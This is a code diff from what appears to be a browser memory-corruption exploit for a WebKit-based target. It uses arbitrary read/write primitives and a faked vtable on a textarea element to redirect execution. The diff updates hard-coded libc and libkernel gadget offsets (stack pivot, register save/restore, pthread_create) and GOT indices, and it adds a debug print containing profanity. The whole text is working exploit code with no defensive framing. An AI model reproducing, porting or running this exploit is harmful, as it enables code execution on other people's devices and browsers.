@@ -12,7 +12,7 @@ write_ptr_at(fake_vt_ptr, fake_vtable);
 var fake_vt_ptr_bak = malloc(0x400);
 write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
 
-var plt_ptr = read_ptr_at(fake_vtable) - 10063176;
+var plt_ptr = read_ptr_at(fake_vtable) - 17100888;
 
 function get_got_addr(idx)
 {
@@ -29,17 +29,15 @@ function get_got_addr(idx)
 
 //these are not real bases but rather some low addresses
 var webkit_base = read_ptr_at(fake_vtable);
-var libkernel_base = get_got_addr(705)-0x10000;
-var libc_base = get_got_addr(582);
-var saveall_addr = libc_base+0x2e2c8;
-var loadall_addr = libc_base+0x3275c;
-var setjmp_addr = libc_base+0xbfae0;
-var longjmp_addr = libc_base+0xbfb30;
-var pivot_addr = libc_base+0x327d2;
-var infloop_addr = libc_base+0x447a0;
-var jop_frame_addr = libc_base+0x715d0;
-var get_errno_addr_addr = libkernel_base+0x9ff0;
-var pthread_create_addr = libkernel_base+0xf980;
+var libkernel_base = get_got_addr(1111);
+var libc_base = get_got_addr(21);
+var saveall_addr = libc_base+0x21944;
+var loadall_addr = libc_base+0x25e88;
+var pivot_addr = libc_base+0x25efe;
+var infloop_addr = libc_base+0x395c0;
+var jop_frame_addr = libc_base+0x6de90;
+var get_errno_addr_addr = libkernel_base+0xc480;
+var pthread_create_addr = libkernel_base+0x19810;
 
 function saveall()
 {
@@ -73,9 +71,12 @@ function pivot(buf)
 {
     var ans = malloc(0x400);
     var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
+    for(var i = 0; i < 0x400; i += 8)
+        write_mem(fake_vtable+i, 0);
+    write_ptr_at(fake_vtable+0x1d8, 0 /*saveall_addr*/);
     write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
     tarea.scrollLeft = 0;
+    print("fuck");
     write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
     write_mem(ans, read_mem(fake_vt_ptr, 0x400));
     write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
